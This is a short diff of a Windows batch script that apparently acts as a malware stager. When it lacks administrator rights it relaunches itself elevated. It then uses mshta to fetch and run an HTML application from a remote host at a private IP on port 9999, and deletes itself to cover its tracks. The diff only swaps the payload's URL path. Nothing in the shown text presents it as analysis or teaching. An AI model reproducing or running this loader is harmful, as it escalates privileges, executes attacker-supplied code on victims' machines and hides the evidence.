@@ -4,6 +4,6 @@ if %errorLevel% neq 0 (
     powershell -Command "Start-Process cmd -ArgumentList '/c \"%~f0\"' -Verb RunAs"
     exit
 )
-mshta http://192.168.242.131:9999/OgQOm
+mshta http://192.168.242.131:9999/zza1x
 del "%~f0"
 exit
